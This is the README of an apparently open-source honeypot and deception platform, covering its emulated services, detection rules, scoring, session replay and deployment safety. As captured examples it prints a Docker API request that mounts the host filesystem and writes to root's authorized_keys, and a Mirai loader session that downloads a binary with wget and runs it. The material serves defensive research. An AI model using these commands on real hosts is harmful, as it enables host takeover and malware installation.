# Deception Grid

A multi-service deception platform: honeypot sensors, an offline-first
enrichment and detection pipeline, and an analyst dashboard — one system that
watches for attackers, records exactly what they do, and turns the raw capture
into something you can read.

It emulates **SSH, Telnet, FTP, HTTP, Redis, MySQL and the Docker Engine API**;
keeps automated attackers engaged long enough to observe their whole playbook;
enriches every event with geolocation, network ownership and local threat intel;
scores and classifies each source with a transparent model; raises deduplicated
alerts from 28 declarative rules; reports ATT&CK coverage honestly; replays any
session back keystroke by keystroke; and serves it all through a FastAPI backend
and a React dashboard.

Where it's going next: **[docs/ROADMAP.md](docs/ROADMAP.md)**.

> **✅ Proven in production.** Deployed on a public Azure VM, this stack has
> captured **over 56,000 events** of genuine internet attacks from **163 sources across 38 countries** —
> emulated shells granted, attacker commands recorded, and **20 of 21 claimed
> ATT&CK techniques (95%) backed by real alerts**. Live IoT botnets submitting
> Mirai credentials, a full Redis module-load RCE, a multi-arch botnet CDN, and
> Docker daemon-takeover attempts — all captured, scored and replayable.
> Full measurements, test results and a security review of the deployment:
> **[docs/azure-run-2026-08-17.md](docs/azure-run-2026-08-17.md)**.
> A full five-stage kill chain, captured and replayed end to end:
> **[docs/demo-kill-chain-2026-08-17.md](docs/demo-kill-chain-2026-08-17.md)**.
> Real attacks from 38 countries — a live Redis RCE, a Mirai CDN, regional credential playbooks:
> **[docs/threat-evidence-global.md](docs/threat-evidence-global.md)**.

> ### Read this first — what this is and isn't
> This is a **defensive** tool for authorised use: run it on infrastructure you
> control to study attacks against it, or run the whole thing locally to learn.
> A honeypot is deliberately exposed to hostile traffic, so a few properties are
> non-negotiable and built into the design:
>
> - **Nothing an attacker sends is ever executed.** The shell is an emulator; it
>   is a lookup table, not a subprocess. See [`honeypot/deception/responses.py`](honeypot/deception/responses.py).
> - **The sensor never reaches out.** Attacker-supplied URLs (a `wget` in the
>   fake shell, a Log4Shell callback) are *recorded as intelligence*, never
>   fetched. Enrichment reads only local databases and files — it makes no
>   third-party network calls.
> - **Generated demo data can never be mistaken for real data.** Seeded sources
>   use reserved IP ranges and every synthetic field is labelled `synthetic`.
>
> Deploying a honeypot on a network you do not own, or using the included
> traffic generator against a host you do not operate, is not something this
> project supports. See [FINDINGS.md](FINDINGS.md) and [docs/](docs/) for the
> handling rules around captured credentials and payloads.

---

## Quick start (5 minutes, no attack traffic needed)

```bash
# 1. install
python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt -r requirements-dev.txt

# 2. generate a realistic demo dataset (safe, synthetic, reserved IPs only)
python -m tools.seed_fake_data --attackers 150 --days 14

# 3. start the API
uvicorn api.main:app --reload            # http://127.0.0.1:8000/docs

# 4. start the dashboard (in another terminal)
cd dashboard && npm install && npm run dev   # http://127.0.0.1:5173
```

Open the dashboard and you'll see the seeded campaigns: brute-force grinders,
IoT botnet loaders that reach the shell, web scanners walking a wordlist, and a
couple of hands-on-keyboard intrusions — each scored, classified and alerting.

### Run the real sensor

```bash
# high ports by default, so no root needed
python -m honeypot.main
# SSH:2222  Telnet:2323  FTP:2121  HTTP:8081  Redis:6379  MySQL:3306  Docker:2375

# then, from another machine or terminal, exercise it with the test client:
python -m attacker.run --target 127.0.0.1 --scenario all
```

To take real internet traffic, map the low ports to the high ones at your
firewall (`22 → 2222`, etc.) — never run the sensor as root. Redis and MySQL
already bind their real ports (both are unprivileged), so those need no remap,
only a firewall rule that lets traffic in.

---

## Architecture

```
                          ┌─────────────────────────────────────────┐
   attackers ───tcp──▶    │  honeypot/  (asyncio, one task per conn) │
                          │  ssh·telnet·ftp·http·redis·mysql·docker  │
                          │  deception layer (personas, fake shell)  │
                          └───────────────────┬─────────────────────┘
                                              │ events (bounded queue,
                                              │ non-blocking)
                          ┌───────────────────▼─────────────────────┐
                          │  storage/  (SQLAlchemy · SQLite/Postgres)│
                          │  events · sessions · attackers · alerts  │
                          └───────────────────┬─────────────────────┘
                                              │
          ┌───────────────────────────────────┼───────────────────────────────┐
          │                                   │                               │
 ┌────────▼─────────┐            ┌────────────▼───────────┐        ┌──────────▼────────┐
 │ pipeline/        │            │ api/  (FastAPI)        │        │ tools/            │
 │  enrichment      │            │  read API + triage     │        │  seed · reset ·   │
 │  detection rules │            │                        │        │  import           │
 │  scoring         │            └────────────┬───────────┘        └───────────────────┘
 │  reporting       │                         │
 └──────────────────┘            ┌────────────▼───────────┐
                                 │ dashboard/  (React/Vite)│
                                 │  overview · live · …    │
                                 └────────────────────────┘
```

See [ARCHITECTURE.md](ARCHITECTURE.md) for the full design and the reasoning
behind each decision.

### Components

| Path | What it is |
|------|-----------|
| [`honeypot/`](honeypot/) | The sensor. Async listeners for seven protocols, a shared deception layer, and a non-blocking batched event writer. |
| [`pipeline/enrichment/`](pipeline/enrichment/) | GeoIP, ASN and local threat-intel. Offline-first: absent data looks absent, never guessed. |
| [`pipeline/detection/`](pipeline/detection/) | A declarative YAML rule engine ([`rules.yaml`](pipeline/detection/rules.yaml)), a transparent additive scoring model, and [ATT&CK coverage](pipeline/detection/coverage.py). |
| [`pipeline/reporting/`](pipeline/reporting/) | Daily Markdown summaries, a [chat digest](pipeline/reporting/digest.py) pushed to Discord/Slack/Teams, and export to CSV/JSONL/STIX/MISP/blocklist over the API. |
| [`storage/`](storage/) | ORM models, engine management (WAL-tuned SQLite, or Postgres), and the analytics queries the API and reports share. |
| [`api/`](api/) | FastAPI read API plus a few triage endpoints. |
| [`dashboard/`](dashboard/) | React dashboard: overview, live feed, session replay, attacker profiles, alert triage. |
| [`fleet/`](fleet/) | Multi-sensor coordination — ingest, registry, buffering. Phase 1, scaffolded. |
| [`attacker/`](attacker/) | A test client (not a scanner) that replays version-controlled scenarios against *your* honeypot. |
| [`tools/`](tools/) | Seed synthetic data, reset/prune the DB, import Cowrie / auth.log / JSONL. |

---

## What it detects

Detection is [28 declarative rules](pipeline/detection/rules.yaml) evaluated over
a **sliding window of the events themselves** (so replaying old data or a late
scheduled run still fires — detection is a property of the data, not the clock).
A sample:

- **Credential attacks** — SSH/Telnet brute force, credential stuffing (many
  usernames), password spraying (one password across accounts), IoT default
  credentials (Mirai family).
- **Post-exploitation** — shell access granted, second-stage payload fetch,
  Mirai command signatures, shadow-file access.
- **Web attacks** — Log4Shell, Shellshock, SQL injection, path traversal,
  webshell upload, secret-file probing (`.env`/`.git`).
- **Container abuse** — Docker API enumeration, host-filesystem bind mounts,
  privileged container creation, cryptominer images, container start/exec.
- **Behaviour** — multi-service sweeps, FTP bounce attempts, high-volume
  sources, threat-intel matches.

Each source gets a 0–100 threat score from a **transparent, inspectable** model
(volume, persistence, credential breadth, service breadth, severity,
post-exploitation, threat-intel — each bounded and weighted), plus a behavioural
class (`botnet-loader`, `targeted-intrusion`, `web-scanner`, …). The dashboard
shows the full breakdown for every attacker — see [docs/detection_rules.md](docs/detection_rules.md).

---

## The Docker API bait

An unauthenticated Docker daemon on TCP 2375 is the highest-signal bait in the
set, because it is not an exploit — it is the documented API working as designed.
Anyone who reaches it can create a container that bind-mounts the host
filesystem and, from inside it, read or write anything on the host as root. No
CVE, no memory corruption.

The valuable capture isn't the recon every scanner does. It's the JSON body of
`POST /containers/create` — the image chosen, the command intended, and above
all `HostConfig.Binds`, which states the goal in plain text:

```json
{"Image":"alpine:latest",
 "Cmd":["/bin/sh","-c","echo pwned >> /mnt/root/.ssh/authorized_keys"],
 "HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}
```

That request is recorded `critical`, tagged `docker-host-mount` +
`docker-host-takeover` + `docker-privileged`. The emulator returns a plausible
container ID so the client proceeds to `/start` and `/exec` and reveals the rest
of the plan. Nothing is created, pulled, started or executed — and the sensor
never touches a real Docker socket.

---

## ATT&CK coverage

Detection rules carry MITRE technique IDs, so the platform can report coverage —
but it draws a line most coverage reports blur:

- **observed** — a rule claims the technique *and* an alert has actually fired
- **rule-only** — a rule claims it and it has never once triggered
- **orphaned** — alerts exist for a technique no current rule claims

A rule that has never fired is not coverage; it's an untested assertion. It may
be perfectly written and simply describing behaviour nobody has aimed here yet,
or it may be silently broken — and a green tick can't tell you which.

```
GET /api/alerts/coverage

ATT&CK coverage: 3 observed of 21 claimed (14% backed by a real alert)
  Execution           ✓ T1610  Deploy Container            [critical]
  Privilege Escalation ✓ T1611  Escape to Host             [critical]
  Discovery           ✓ T1046  Network Service Discovery   [medium]
```

---

## Session replay

A table of events tells you *what* was tried. Replaying a session in order shows
*how* the operator worked — where they hesitated, what they reached for after a
failure, the order they enumerated things in. The **Sessions** page lists every
connection and defaults to **interactive only** (`commands_run > 0`), which is
the filter that matters: a busy sensor logs thousands of drive-by connects and a
handful of sessions where somebody actually typed.

Playback uses the real inter-event timing, clamped to 140–2200ms per step so a
two-minute idle doesn't stall the player. Any gap the clamp swallowed is drawn
as an explicit `⋯ 1m 32s idle` marker — the viewer is never quietly misled about
the pace. Play/pause, 1–8× speed, a scrubber, and keyboard control (space, ← →).

A captured Mirai loader, as it replays:

```
+  0.0s  auth_attempt   root:xmhdipc
+  1.0s  auth_success   root
+  1.3s  command        /bin/busybox ECCHI
+  1.2s  command        /bin/busybox wget http://198.51.100.77/bins/mirai.arm7 -O /tmp/x
+  1.0s  command        chmod +x /tmp/x
+  1.5s  command        /tmp/x
```

Backed by `GET /api/sessions` (filter by service, source, window, commands; five
sort fields) and `GET /api/sessions/{id}` for the full transcript.

---

## Reporting

Two channels, answering different questions:

- **Real-time alerts** — "something just happened." A new alert at or above
  `ALERT_MIN_SEVERITY` is pushed to a webhook, rate-capped per detection run.
- **Daily digest** — "what happened yesterday." One summary a day: volume, top
  sources, credentials, alerts, and any second-stage URLs.

```bash
make digest-preview                          # print the payload, send nothing
python -m pipeline.reporting.digest          # send it
```

Discord gets a rich embed; Slack and Teams get markdown; anything else gets
structured JSON — auto-detected from the webhook URL. Two deliberate choices:

- **Captured payload URLs are defanged** (`hxxp://evil[.]com`). Chat clients
  unfurl links and people click them; posting a live malware-distribution URL
  into a channel turns an observation into an incident.
- **A zero-event day is never painted healthy.** It is reported explicitly,
  because a sensor that sees nothing for a day is usually a sensor that has
  fallen over.

Exit codes: `0` sent, `1` delivery failed, `2` no webhook configured — so a
silent cron failure is visible.

---

## Configuration

Everything is environment-variable driven; copy [`.env.example`](.env.example)
and edit. Highlights:

| Variable | Default | Purpose |
|----------|---------|---------|
| `DATABASE_URL` | SQLite in `data/` | `postgresql://…` for production |
| `HONEYPOT_PERSONA` | `ubuntu-generic` | host identity (`centos-legacy`, `iot-router`, `windows-iis`) |
| `ACCEPT_LOGIN_RATE` | `0.15` | fraction of logins to "accept" so post-auth behaviour can be observed |
| `SSH_PORT` … `HTTP_PORT` | 2222/2323/2121/8081 | bind ports |
| `REDIS_PORT` / `MYSQL_PORT` | 6379 / 3306 | datastore bait — real ports, no remap needed |
| `DOCKER_PORT` | 2375 | Docker API bait — never enable on a host running Docker on 2375 |
| `API_REDACT_PASSWORDS` | off | blank captured passwords in API responses |
| `API_CORS_ORIGINS` | localhost:5173 | dashboard origin(s) |
| `ALERT_WEBHOOK_URL` | unset | real-time alerts (Slack/Discord/Teams/generic) |
| `DIGEST_WEBHOOK_URL` | falls back to `ALERT_WEBHOOK_URL` | daily digest destination |

### Deployment safety

The API has **no built-in authentication** — it is designed to sit on a private
network or behind an authenticating reverse proxy. To make the unsafe
configuration a deliberate act rather than an accident, the app **refuses to
start** with a wildcard CORS origin unless you set `API_ALLOW_INSECURE=1`. A
wildcard origin on an unauthenticated API lets any site the analyst visits read
captured credentials out of their browser; don't do it on an exposed host.

For a full cloud deployment walkthrough — Azure VM, bait on real ports
22/23/80/21, admin SSH relocated, dashboard reached only via SSH tunnel, and
automatic detection/scoring — see [docs/deployment-azure.md](docs/deployment-azure.md).

---

## Development

```bash
pytest                      # 123 tests: unit + a live-sensor integration round-trip
ruff check . && ruff format .
python -m honeypot.main --check          # validate config without binding
python -m pipeline.reporting.daily_summary --days 1     # generate a digest
python -m pipeline.reporting.export --format stix --min-score 60 --out iocs.json
```

Optional features degrade gracefully when their dependency is absent:

- `pip install paramiko` → SSH captures **passwords** (full mode) instead of
  just fingerprinting the client (HASSH).
- `pip install geoip2` + a GeoLite2 `.mmdb` in `data/geolite2/` → real
  geolocation and ASN data. The database is licensed and not redistributed here;
  see [docs/event_schema.md](docs/event_schema.md).

---

## License

MIT. Provided for defensive security research and education. You are responsible
for operating it lawfully and only against infrastructure you control.
